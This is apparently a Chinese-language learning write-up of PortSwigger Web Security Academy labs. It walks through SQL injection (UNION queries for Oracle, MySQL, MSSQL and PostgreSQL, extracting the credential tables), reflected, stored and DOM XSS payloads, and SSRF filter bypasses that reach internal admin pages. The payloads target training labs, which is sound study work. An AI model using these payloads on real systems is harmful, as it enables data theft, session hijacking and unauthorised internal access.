# SQLI

## https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data

找到注入点

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/8d24667f5537.webp)

```Plain Text
https://0ad80089046ed7a28353fd47006600b1.web-security-academy.net/filter?category=
```

当输入单引号时服务器报错，输入双引号或者数字正常返回

由于union联合查询需要列数匹配，所以我们先用order by判断字段数

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/ece2d32ef410.webp)

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/3a8e70afe9dd.webp)

直到9时服务器报错，证明有八个字段值

用union select判断回显位置

**这边要注意，union的结果类型要相同**

这边以eshop的Category表为例，这边where条件如果是字符类型，后面union如果是数字型，就会报错

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/4177e211d71a.webp)

所以判断回显位置的payload应该是

```SQL
https://0ad80089046ed7a28353fd47006600b1.web-security-academy.net/filter?category=' union select '1','2','3','4','5','6','7','8'--+
```

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/0b3022d15774.webp)

确定3为回显位置，于是开始确定数据库

这边我一般都是直接database\(\)，但是发现执行不了，以为语句有问题，结果一问ai才知道我给每个靶场都默认mysql数据库了

每个类型的数据库查询数据库名的语法不同

###### 如果后端是 Oracle 数据库

```C++
1' union select '1','2',(SELECT global_name FROM global_name),'4','5','6','7','8' FROM dual--+
```

###### 如果后端是 MySQL数据库

```C++
1' union select '1','2',database(),'4','5','6','7','8'--+
```

###### 如果后端是 Microsoft SQL Server 数据库

```C++
1' union select '1','2',db_name(),'4','5','6','7','8'*--+*
```

###### 如果后端是PostgreSQL

```C++
1' union select '1','2',current_database(),'4','5','6','7','8'--+
```

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/05c8b4aa69d4.webp)

这边只有current\_database\(\)正常返回，推断靶场使用的是**PostgreSQL数据库，当前数据库名是“academy\_labs”**

用下面这个payload也能证明

```SQL
https://0a40002704320fb680e50d7300650099.web-security-academy.net/filter?category=1'+union+select+'1','2',version(),'4  ','5','6','7','8'--+
```

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/67c2c91a152b.webp)





###### 这边我是想通过看mysql的information\_schema来理解sql注入怎么看一个数据库的所有表名

下一步是看当前数据库中存在什么表，我们就可以借助information\_schema数据库中的tables表来查询

先来看看information\_schema数据库tables表的结构，以查询mysql中的world表名为例

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/a1c314313397.webp)

我们可以看到该表中存在两个字段，一个是TABLE\_SCHEMA存放的所有的数据库名，TABLE\_NAME存放了所有的表名

如果我们要查询world数据库中的所有表名，我们就可以使用下面的语句

```Plain Text
select table_name from information_schema.TABLES where table_schema='world';
```

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/2246bfeac76a.webp)

因为只有一个回显位置，所以我们可以使用group\_concat\(\)将查询结构合并为一个字符串

```Plain Text
select GROUP_CONCAT(table_name) from information_schema.TABLES where table_schema='world';
```

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/9fac9a70feff.webp)



###### 但是，注意这题用的是PostgreSQL，跟mysql完全不一样

在 PostgreSQL 中，每一个数据库（Database）都拥有自己独立的一套 `information_schema` 视图。这是它和 MySQL 的一个重大区别。

下面是历尽千辛万苦本地部署的PostgreSQL数据库，创建了users和products表来进行理解

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/14ac5d1c5201.png)

所以相应的我们的payload也要发生改变，不能使用group\_concat了，而要改成STRING\_AGG\(table\_name, ','\)

```Java
1' union select '1','2',STRING_AGG(table_name, ','),'4','5','6','7','8' from information_schema.tables where table_schema='public'--+
```

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/dac23c0f1503.webp)

我去不早说，当我正在纠结怎么查询表的字段值时，研究发现information\_schema\.columns表中东西更全，包括每张表的名字和每张表的字段名。这边懒得改了，能用就行

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/d4fbca4281bf.png)

```SQL
https://0a8200fc04ede390802e1cae007000c3.web-security-academy.net/filter?category=1' union select '1','2',STRING_AGG(column_name, ','),'4','5','6','7','8' from information_schema.columns where table_name='products'--+
```

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/40f31f5fa304.webp)



😂😂😂😂😂😂

玩半天发现这个靶场只需要我们输出隐藏的商品就行了，主要是太卡了可能过程已经解决了但是没记录到

无论如何，通过这关的payload如下

```Plain Text
https://0a8200fc04ede390802e1cae007000c3.web-security-academy.net/filter?category=Accessories' or '1'='1
```





ok，下面这关我得认真看题目要求了

## https://portswigger.net/web-security/sql-injection/lab-login-bypass

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/894e30168f42.webp)

该实验在登录功能中存在一个SQL注入漏洞。

要解决该实验，需要执行一次SQL注入攻击，以管理员（administrator） 用户的身份登录到应用程序。

单引号闭合直接万能密码秒了

```Plain Text
' or '1'='1
```



## https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle

该实验在产品类别过滤功能中存在一个SQL注入漏洞。您可以使用UNION攻击来获取注入查询的结果。

要解决该实验，请显示数据库版本字符串。

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/b26d38b99013.webp)

两个字段

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/f5bf08ecb24f.webp)

哎，怎么回显不了

我chovy

目标数据库是 Oracle。Oracle 的 `SELECT` 语句有严格规定：必须包含 `FROM` 子句。需要添加 `FROM dual`（dual 是 Oracle 的虚拟表）。同时通常用 `NULL` 占位

所以payload是

```Plain Text
https://0a30000f04fb844980680842008f0045.web-security-academy.net/filter?category=' union select null,null from dual--+
```

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/5320edb3907b.webp)

这样确实有回显了

下面就用Oracle的版本回显语法就行

```Plain Text
https://0a30000f04fb844980680842008f0045.web-security-academy.net/filter?category=
' UNION SELECT banner, NULL FROM v$version--+
```



## https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/16c8d8fc06b1.webp)

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/4532fa1ef0d2.webp)

这边用1,2就能正常回显了

#### 如果后端是 Microsoft SQL Server

```Plain Text
' UNION SELECT @@version, NULL*--+*
```

或者（如果列数多于2，补齐NULL）：

```Plain Text
' UNION SELECT @@version, NULL, NULL*--+*
```

#### 如果后端是 MySQL

```Plain Text
' UNION SELECT @@version, NULL*--+*
```

或者使用：

```Plain Text
' UNION SELECT version(), NULL*--+*
```

注意：MySQL的注释符也可以是 `#`，但在URL中需要编码为 `%23`。





## https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/977c0fa06360.webp)

实验：SQL注入攻击——列出非Oracle数据库中的数据库内容

该实验在产品类别过滤功能中存在一个SQL注入漏洞。查询的结果会返回在应用程序的响应中，因此您可以使用UNION攻击从其他表中检索数据。

该应用程序有一个登录功能，并且数据库中包含一个存储用户名和密码的表。您需要确定该表的名称及其包含的列，然后检索该表的内容，以获取所有用户的用户名和密码。

要解决该实验，请以 `administrator` 用户的身份登录。



看来我们是需要通过产品类别的注入点，获取到账户表，然后用admin账户进行登录

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/4fef0ec3a339.webp)

判断出来说两个字段，下面判断回显位置

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/ef0a8e8e8768.webp)

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/8f35aab6f3e8.webp)

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/509f9b3bb0ba.webp)

这边判断还是之前那个数据库，之前用之前的payload查看所有表

```Plain Text
https://0a16009003709246802a6cc9003200b7.web-security-academy.net/filter?category=' union select '1',STRING_AGG(table_name, ',') from information_schema.columns where table_schema='public'--+
```

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/2d6615ac8434.webp)

看到可疑目标users\_beemrx表了

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/1e027c6ad83a.webp)

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/1d4c55451169.webp)

```Plain Text
https://0a16009003709246802a6cc9003200b7.web-security-academy.net/filter?category=' union select username_mebmkr,password_esqokj from users_beemrx--+
```

这边也是成功拿下账号密码，去尝试登录，登录成功



## https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/41e7c3627b22.webp)

该实验在产品类别过滤功能中存在一个SQL注入漏洞。查询的结果会返回在应用程序的响应中，因此您可以使用UNION攻击从其他表中检索数据。

该应用程序有一个登录功能，并且数据库中包含一个存储用户名和密码的表。您需要确定该表的名称及其包含的列，然后检索该表的内容，以获取所有用户的用户名和密码。

要解决该实验，请以 administrator 用户的身份登录。



这一关看来需要熟悉oracle语法了

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/c1ef3e7b7dc1.webp)

还是两个字段

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/e04153506785.webp)

null占位，dual默认表

查看当前数据库的表名

```Plain Text
https://0a26006c04b90ab580bd0807004e0030.web-security-academy.net/filter?category=' UNION SELECT table_name, NULL FROM user_tables--+
```

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/65c1f460509c.webp)

表名是USERS\_SAYUJR，下面获取字段名

```SQL
https://0a26006c04b90ab580bd0807004e0030.web-security-academy.net/filter?category=' UNION SELECT column_name, NULL FROM user_tab_columns WHERE table_name = 'USERS_SAYUJR'--+
```

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/5bf42714dc4c.webp)



直接select查询

```SQL
https://0a26006c04b90ab580bd0807004e0030.web-security-academy.net/filter?category=' UNION SELECT USERNAME_RZOLHN, PASSWORD_GFUNGG FROM USERS_SAYUJR--+
```

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/8bfecfa8a276.webp)





# XSS（Cross\-site scripting）

## https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/1eb1d1438f11.webp)

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/dd0b50135e7d.webp)

在搜索框输出就完事

```SQL
<script>alert(1)</script>
```





## https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded

在评论区输入xss脚本就行

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/9a5a6f12d65b.webp)





## https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink

实验：使用源 location\.search 在 document\.write 接收器中实现 DOM 型 XSS

本实验在搜索查询跟踪功能中存在一个基于 DOM 的跨站脚本漏洞。它使用了 JavaScript 的 `document.write` 函数，该函数会将数据写入页面。`document.write` 函数被调用时使用了来自 `location.search` 的数据，而你可以通过网站 URL 来控制该数据。

要解决本实验，请执行一次调用 `alert` 函数的跨站脚本攻击。

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/25cbb850c577.webp)

打开是一个搜索框，这应该是我们写入脚本的地方

我们查看源代码

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/6671d78c5f3a.webp)

发现我们输入的语句会与'\<img src="/resources/images/tracker\.gif?searchTerms='连接，然后 document\.write写到页面上

所以我们可以先用"\>闭合掉前面的内容

\<img src="/resources/images/tracker\.gif?searchTerms="\>

然后后面跟xss脚本\<script\>alert\(1\)\</script\>

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/b037e09d9323.webp)

就执行成功了



## https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/f313769816b4.webp)

还是一个搜索框，直接看源代码

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/9b90c630e687.webp)

`document.write` 和 `innerHTML` 都是“写 HTML”的接口，不是“执行 JS”的接口。

直接输入

```SQL
<img src=x onerror=alert(1)>
```



## https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink

### 第一步：看清 lab 标题

DOM XSS in jQuery anchor href attribute sink using location\.search source

这个标题已经告诉了我们一切：

- DOM XSS — 不是 Stored XSS

- jQuery anchor href attribute sink — 用 jQuery 设置 \<a\> 的 href 属性

- location\.search source — 数据来源是 URL 查询参数

### 第二步：找到漏洞代码

在 /feedback 页面底部有这段 JavaScript：

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/7010ee453f17.webp)

#### 关键点：

- window\.location\.search 取 URL 中 ? 后面的部分

- URLSearchParams 解析出 returnPath 参数的值

- $\('\#backLink'\)\.attr\("href", value\) 把值直接塞进 \<a\> 的 href 属性

### 第三步：为什么这样能 XSS

\<a\> 标签的 href 支持 javascript: 伪协议。当你设置：

\<a href="javascript:alert\(document\.cookie\)"\>Back\</a\>

用户点击这个链接时，浏览器就会执行 javascript: 后面的代码。

### 第四步：构造 payload

直接访问：

/feedback?returnPath=javascript:alert\(document\.cookie\)

页面加载后，Back 链接变成：

\<a id="backLink" href="javascript:alert\(document\.cookie\)"\>Back\</a\>

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/7d93e67a1c5a.webp)

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/ab7b83717c4a.webp)



# **Server\-side request forgery \(SSRF\)**

## **Lab: Basic SSRF against the local server**

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/9d8a5906e287.webp)

本实验存在库存查询功能，该功能会从内部系统拉取数据。 要完成实验，请修改库存查询的 URL，访问位于 `http://localhost/admin` 的管理后台页面，并删除用户 `carlos`。

每个产品他有个查库存的功能

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/16a3b6775f1e.webp)

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/95ff7660a175.webp)

抓包可以看到服务器主动去请求一个接口。我们尝试给他改成本地的`http://localhost/admin` 的管理后台页面

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/34cc3d851f8e.webp)

这边就能显示该页面，需要注意的是直接点击delete（这边是做好了写的笔记，所有题目要求的用户已经用正确方法删除了）他会出现报错说管理员接口需要登录管理员账号才能使用

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/0c47f8b9f6a4.webp)

于是我们想到，直接将这个接口让服务器自己进行访问调用，便能利用这个端口

把这个请求参数之间改成删除账号的接口

这个接口的具体url可以通过上面手动点击删除时抓包获得

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/1d0f51cf5811.webp)



![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/5b6d381afd67.webp)

发包就能成功利用服务器发送请求删除题目要求账号



## **Lab: Basic SSRF against another back\-end system**

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/a1e853f508ac.webp)

本实验存在库存查询功能，该功能会从一套内部系统获取数据。 要完成实验：利用库存查询功能，扫描内网 `192.168.0.X` 网段，寻找运行在 8080 端口 的管理后台；找到后台后，通过该接口删除用户 `carlos`。

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/bb032712e2ec.webp)

抓包之后进行整个网段的爆破

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/51b3097731d5.png)

爆破完后发现只有41回显不同

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/3cdd6dceb404.webp)

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/af398757a2aa.png)

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/f7c9ff39f761.webp)

可能是我们请求包的路径不对，根据上一题的经验和猜测，直接访问/admin路径

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/76b9295121bc.webp)

确实有回显，那么还是调用刚才的删除账号接口，进行删除

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/34b687365a4c.webp)

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/c0e1281b8380.webp)

这边其实就能证明，如果服务器存在SSRF漏洞那么就能实现内网的探测



## **Lab: SSRF with blacklist\-based input filter**

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/3f822386c002.webp)

本实验包含库存查询功能，该功能会从内部系统获取数据。 要完成实验：修改库存查询的 URL，访问位于 `http://localhost/admin` 的管理后台，并删除用户 `carlos`。

开发者部署了两套简陋的 SSRF 防护机制，你需要找到方法绕过。

尝试之前的payload发现会报错

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/7bbf52ceb44d.webp)

出于安全原因，外部库存查询被阻止

试了一下127\.0\.0\.1也不行

猜测应该是服务器端对本机地址进行了过滤检查



对url简写发现也不行

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/e67db323c07a.webp)

看了一下题目提示，发现可以对字母a进行双重url编码

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/de0f5b012d60.webp)

这个编码的时候，我用了我最习惯用的cyberchef发现编码不了

豆包说：

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/4ea7e908c1e6.png)

于是我只能用burpsuite的decoder模块进行编码，刚好熟悉一下吧，毕竟感觉高手都是用这个

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/33a88003ccdb.webp)

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/7cf4fa776a46.webp)

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/785df76a5029.png)



## **Lab: SSRF with whitelist\-based input filter**

刚才是黑名单过滤，现在是白名单过滤了

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/496857441303.webp)

1. 将 `stockApi` 参数内 URL 修改为 `http://127.0.0.1/`，可以观察到应用会解析 URL、提取主机名，并与白名单进行校验。

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/21eda36dab0e.webp)

2. 将 URL 修改为 `http://username@stock.weliketoshop.net/`，请求被接受。说明 URL 解析器支持内嵌账号凭证（userinfo@host）格式。

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/aeaacb3c2c7b.webp)

3. 在用户名后追加 `#`，会发现 URL 被拒绝。

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/6e136518e05e.webp)

4. 对 `#` 进行双重 URL 编码得到 `%2523`，此时会收到高度可疑的 “服务器内部错误” 响应。代表服务器尝试连接到字符串 `username`。

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/45e536154de3.webp)

5. 想要访问后台并删除目标用户，将 URL 修改为：`http://localhost:80``%``2523@stock.weliketoshop.net/admin/delete?username=carlos`

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/a8853648dfd1.webp)

![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/e39f6be38663.webp)
